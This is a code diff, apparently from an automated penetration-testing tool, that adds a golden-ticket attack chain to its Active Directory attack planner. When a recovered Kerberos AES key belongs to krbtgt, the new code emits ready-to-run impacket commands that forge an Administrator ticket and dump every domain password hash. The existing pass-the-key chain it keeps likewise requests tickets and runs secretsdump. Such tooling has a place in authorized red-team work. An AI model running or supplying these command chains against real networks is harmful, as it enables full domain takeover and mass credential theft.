@@ -1025,21 +1025,39 @@ def run(report, store, ui=None):
         _ptk_dom = store.dominant_domain() or "<dom>"
         _ptk_dc = store.dc_ip() or "<DC-IP>"
         _ptk_fqdn = store.dc_fqdn() or "<DC-FQDN>"
-        # Score is between R7 (11ish for domain user hash) and R-GOLDEN
-        # (15 for krbtgt). AES256 for regular user is same value tier as
-        # PtH - ~8-11 depending on target proximity.
-        chains.append(Chain("R-PTK", "pass-the-key",
-            f"Kerberos AES key for {_ptk_user} -> impersonate via TGT",
-            crit=8, conf=0.85, ready=1.5, prox=0.9,          # score 9.18
-            commands=[
-                f"# recovered AES key ({_ev.hash[:16]}...) - request a TGT:",
-                f"impacket-getTGT '{_ptk_dom}/{_ptk_user}' "
-                f"-aesKey {_ev.hash} -dc-ip {_ptk_dc}",
-                f"export KRB5CCNAME='{_ptk_user}.ccache'",
-                f"impacket-secretsdump -k -no-pass -dc-ip {_ptk_dc} "
-                f"'{_ptk_dom}/{_ptk_user}@{_ptk_fqdn}'   "
-                f"# if user has DCSync rights -> R-GOLDEN cascade",
-            ], src=_ev.source, line=_ev.line))
+        # iter-113: krbtgt AES key = R-GOLDEN-tier. Emit a golden-ticket
+        # variant that forges Administrator via ticketer + aesKey (impacket
+        # accepts aes256 for -aesKey). Otherwise regular Pass-the-Key.
+        _is_krbtgt = _ptk_user.lower() == "krbtgt"
+        if _is_krbtgt:
+            _sid_ptk = store.domain_sid() or "<S-1-5-21-...>"
+            chains.append(Chain("R-GOLDEN", "golden ticket via krbtgt AES key",
+                f"krbtgt AES key present -> forge Administrator TGT (score 15)",
+                crit=10, conf=1.0, ready=1.5, prox=1.0,      # score 15.0
+                commands=[
+                    f"impacket-ticketer -aesKey {_ev.hash} "
+                    f"-domain-sid {_sid_ptk} -domain {_ptk_dom} Administrator",
+                    f"export KRB5CCNAME=Administrator.ccache",
+                    f"impacket-secretsdump -k -no-pass -dc-ip {_ptk_dc} "
+                    f"'{_ptk_dom}/Administrator@{_ptk_fqdn}'   "
+                    f"# every domain hash",
+                ], src=_ev.source, line=_ev.line))
+        else:
+            # Score is between R7 (11ish for domain user hash) and R-GOLDEN
+            # (15 for krbtgt). AES256 for regular user is same value tier as
+            # PtH - ~8-11 depending on target proximity.
+            chains.append(Chain("R-PTK", "pass-the-key",
+                f"Kerberos AES key for {_ptk_user} -> impersonate via TGT",
+                crit=8, conf=0.85, ready=1.5, prox=0.9,      # score 9.18
+                commands=[
+                    f"# recovered AES key ({_ev.hash[:16]}...) - request a TGT:",
+                    f"impacket-getTGT '{_ptk_dom}/{_ptk_user}' "
+                    f"-aesKey {_ev.hash} -dc-ip {_ptk_dc}",
+                    f"export KRB5CCNAME='{_ptk_user}.ccache'",
+                    f"impacket-secretsdump -k -no-pass -dc-ip {_ptk_dc} "
+                    f"'{_ptk_dom}/{_ptk_user}@{_ptk_fqdn}'   "
+                    f"# if user has DCSync rights -> R-GOLDEN cascade",
+                ], src=_ev.source, line=_ev.line))
 
     # iter-24: R-DPAPI - pair a recovered masterkey sha1 (pypykatz / impacket
     # output) with a Windows Credential vault file we've seen. With both,
